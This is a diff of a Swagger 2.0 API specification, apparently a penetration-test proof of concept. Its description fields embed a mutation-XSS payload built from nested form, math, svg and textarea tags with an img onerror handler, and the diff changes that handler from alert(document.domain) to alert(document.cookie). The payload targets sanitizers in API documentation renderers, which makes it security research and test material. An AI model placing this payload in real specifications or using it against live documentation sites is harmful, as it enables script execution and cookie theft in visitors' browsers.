@@ -3,10 +3,10 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src>"></form>
 
   version: production
-basePath: https://afine.com
+basePath: https://pentest.test
 produces:
 - application/xml
 - application/json
@@ -25,11 +25,11 @@ paths:
       - somettext
       operationId: findAccounts
       summary: this is example text
-  "/malformed_by_afine":
+  "/test1":
     delete:
       parameters:
       - description: |
-          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src>"></form>
 
         format: int64
         in: path
@@ -40,9 +40,9 @@ paths:
         '200':
           description: No response was specified
       tags:
-      - afine
-      operationId: afine
-      summary: afine
+      - pentest
+      operationId: pentest
+      summary: pentest
     get:
       parameters:
       - description: this is example text
@@ -55,6 +55,6 @@ paths:
         '200':
           description: No response was specified
       tags:
-      - afine
+      - pentest
       operationId: some_operation
       summary: this is example text
